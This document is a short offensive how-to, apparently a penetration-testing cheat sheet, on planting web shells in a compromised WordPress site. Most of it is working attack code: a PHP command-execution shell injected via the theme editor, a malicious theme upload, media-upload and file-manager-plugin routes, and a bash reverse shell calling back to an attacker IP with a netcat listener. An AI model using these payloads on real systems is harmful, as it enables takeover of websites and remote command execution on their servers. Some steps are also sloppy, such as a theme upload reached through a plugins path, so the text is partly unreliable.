Once access to a WordPress admin panel or file system is obtained, a web shell can be deployed through various methods.

## Uploading a Web Shell via Theme Editor
If file editing is enabled:

1. Go to: `Appearance > Theme File Editor`
2. Select `404.php` or `functions.php`
3. Inject a PHP web shell payload
```php
<?php system($_GET['cmd']); ?>
```
Access it via:
```bash
http://target.com/wp-content/themes/[theme]/404.php?cmd=whoami
```


---

## Uploading a Shell as a Theme

1. Download a legitimate Wordpress Theme.
2. Unzip the Theme.
3. Create a new document inside the Theme whit the following content: 
```php
<?php system($_GET['cmd']); ?>
```

4. Zip the theme:

```php
zip shell.zip <Theme_folder>
```

5. Upload the Theme `shell.zip`.
6. Access:
```bash
http://target.com/wp-content/plugins/shell/shell.php?cmd=id
```

---

## Using Reverse Shell Instead of Web Shell

Replace the content of a document for a payload with a reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'");
?>
```

Start listener:

```bash
nc -lvnp 4444
```

---

## Abusing Media Uploads (with .php.jpg Bypass)
If file upload restrictions are weak:
1. Rename your shell to `shell.php.jpg`
2. Upload via: `Media > Add New`
3. Try to access the shell directly


This often fails due to MIME checks, but some misconfigured setups allow it.

---

## Upload Shell via File Manager Plugin (if installed)

If plugins like **WP File Manager** are present:

- Navigate to `/wp-content/plugins/wp-file-manager/lib/files/`
- Upload PHP shell directly via GUI
- Access it via:
```bash
http://target.com/wp-content/plugins/wp-file-manager/lib/files/shell.php
```